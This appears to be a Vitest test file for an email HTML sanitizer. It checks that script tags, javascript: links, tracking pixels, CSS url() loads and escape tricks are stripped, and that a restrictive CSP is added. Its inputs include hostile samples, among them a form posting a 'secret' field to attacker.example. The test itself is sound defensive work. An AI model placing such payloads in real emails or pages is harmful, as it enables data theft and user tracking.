/** @vitest-environment jsdom */

import { describe, expect, it } from "vitest";
import {
  buildMailHtmlDocument,
  isMailHtmlBody,
  sanitizeMailHtml,
  sanitizeMailStyle
} from "../src/mail-content-security";

describe("sanitizeMailHtml", () => {
  it("blocks executable markup and remote tracking resources", () => {
    const sanitized = sanitizeMailHtml(`
      <script>window.pwned = true</script>
      <form action="https://attacker.example/collect"><input name="secret"></form>
      <img data-kind="remote" src="https://tracker.example/pixel.gif">
      <div data-kind="styled" style="color: red; background-image: url(https://tracker.example/bg.png)">hello</div>
    `);
    const template = document.createElement("template");
    template.innerHTML = sanitized;

    expect(template.content.querySelector("script, form, input")).toBeNull();
    expect(template.content.querySelector('[data-kind="remote"]')?.getAttribute("src")).toBeNull();
    expect(template.content.querySelector('[data-kind="styled"]')?.getAttribute("style")).toBe("color: red");
    expect(sanitized).not.toContain("tracker.example");
  });

  it("keeps embedded images and routes approved links through a new window", () => {
    const sanitized = sanitizeMailHtml(`
      <img data-kind="embedded" src="data:image/png;base64,AA==">
      <a data-kind="safe" href="https://example.com/message">open</a>
      <a data-kind="unsafe" href="javascript:alert(1)">bad</a>
    `);
    const template = document.createElement("template");
    template.innerHTML = sanitized;

    expect(template.content.querySelector('[data-kind="embedded"]')?.getAttribute("src")).toBe("data:image/png;base64,AA==");
    expect(template.content.querySelector('[data-kind="safe"]')?.getAttribute("target")).toBe("_blank");
    expect(template.content.querySelector('[data-kind="safe"]')?.getAttribute("rel")).toBe("noopener noreferrer");
    expect(template.content.querySelector('[data-kind="unsafe"]')?.getAttribute("href")).toBeNull();
  });
});

describe("mail document policy", () => {
  it("removes CSS URL loads and embeds a restrictive document CSP", () => {
    expect(sanitizeMailStyle("font-weight: bold; background: url('https://tracker.example/a')")).toBe("font-weight: bold");
    // CSS 反转义后仍必须被拦下（纵深防御）。
    expect(sanitizeMailStyle("background: u\\72 l(https://tracker.example/x.png)")).toBe("");
    expect(sanitizeMailStyle("background: \\75rl(https://tracker.example/x.png)")).toBe("");
    expect(sanitizeMailStyle("color: red; -moz-binding: url(x)")).toBe("color: red");
    const documentHtml = buildMailHtmlDocument("<p>safe</p>");
    expect(documentHtml).toContain("default-src 'none'");
    expect(documentHtml).toContain("img-src data: cid:");
    expect(documentHtml).toContain('<meta name="referrer" content="no-referrer">');
  });

  it("uses the normalized content type instead of guessing from plaintext markup", () => {
    expect(isMailHtmlBody("text")).toBe(false);
    expect(isMailHtmlBody("HTML")).toBe(true);
    expect(isMailHtmlBody("text/html; charset=utf-8")).toBe(true);
  });
});
